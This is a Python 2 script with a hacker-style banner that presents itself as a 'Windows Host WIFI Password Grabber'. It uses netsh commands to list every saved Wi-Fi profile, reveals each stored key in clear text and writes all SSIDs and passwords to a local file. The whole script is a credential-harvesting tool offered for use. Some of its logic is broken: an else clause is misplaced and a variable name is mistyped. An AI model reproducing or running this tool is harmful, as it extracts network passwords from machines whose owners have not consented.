#!/usr/bin/env python2
import os
import subprocess
import platform
banner='''
	 __  __           _____          ____    ___        _   _____        
	|  \/  |   ___   |___ /   ___   / ___|  / _ \    __| | |___ /   _ __ 
	| |\/| |  / _ \    |_ \  / __| | |     | | | |  / _` |   |_ \  | '__|
	| |  | | | (_) |  ___) | \__ \ | |___  | |_| | | (_| |  ___) | | |   
	|_|  |_|  \___/  |____/  |___/  \____|  \___/   \__,_| |____/  |_|   

			#######################################
			# Windows Host WIFI Password Grabber  #
			#          Coded By                   #
			#          Mo3sCod3r                  #
			#     Email: cod3wizard@gmail.com     #
			#######################################
'''
print(banner)

try:
    if platform.system() == "Windows":
        Passfile = open("password.txt","w")
        command = "netsh wlan show profiles"
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        print("[+] Printing all The Wifi SSID(names) and Passwords....\n")
        while True:
            line = cmd.stdout.readline().strip("\n").strip(" ")
            if ":" in line:
                words = line.split(":")[0]
                wifiSsid = line.split(":")[1]
                
                if str(wifiSsid) != "":
                    newCommand = 'netsh wlan show profile "'+str(wifiSsid).strip(" ")+'" key = clear'
                    newcmd = subprocess.Popen(newCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    while True:
                        newline = newcmd.stdout.readline().strip("\n")
                        
                        if "Key Content" in newline:
                            keycontent = newline.split(":")[0]
                            passkey = newline.split(":")[1]
                            #print("Wifi SSID(Name) = "+str(wifiSsid)+" \tPassword = "+str(passkey)+"\n")
                            print("[+]Saving Into Password.txt File Please Wait A few Seconds....")
                            Passfile.write("Wifi SSID(Name) = "+str(wifiSsid)+" \tPassword = "+str(passkey)+"\n")
                            
                            break
                        if newline =="":
                            break
                else:
                    print("[+] SSID not found")
                    pass
            if line =="":
                break
        else:
            print("[+] Sorry Currently Intended for Windows...")
        print("\n[+] Done....\n")
        
    
    input("Press Enter to Exit...")
    passfile.close()
except:
    print("[+] Terminated....")

